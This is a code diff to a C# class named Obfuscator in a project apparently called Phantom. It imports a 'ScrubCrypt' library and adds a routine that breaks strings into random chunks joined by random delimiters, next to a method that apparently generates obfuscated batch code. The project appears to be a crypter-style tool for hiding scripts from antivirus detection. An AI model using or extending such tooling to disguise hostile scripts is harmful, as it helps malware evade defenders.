@@ -1,13 +1,45 @@
-﻿using System;
+﻿using ScrubCrypt;
+using System;
 using System.Collections.Generic;
 using System.Linq;
-
+using System.Text;
 using static Phantom.Utils;
 
 namespace Phantom
 {
     public class Obfuscator
     {
+
+
+        public static string InsertChar(string input, params string[] d)
+        {
+            List<string> list = new List<string>();
+            string text = string.Empty;
+            foreach (char c in input)
+            {
+                if (text.Length >= Randomiser.RNG.Next(1, 4))
+                {
+                    list.Add(text);
+                    text = string.Empty;
+                }
+                text += c.ToString();
+            }
+            list.Add(text);
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (string str in list)
+            {
+                if (d.Length > 1)
+                {
+                    stringBuilder.Append(str + d[Randomiser.RNG.Next(d.Length)]);
+                }
+                else
+                {
+                    stringBuilder.Append(str + d[0]);
+                }
+            }
+            return stringBuilder.ToString();
+        }
+
         public static (string, string) GenCodeBat(string input, Random rng, string SetVarName, int level = 5)
         {
             string ret = string.Empty;
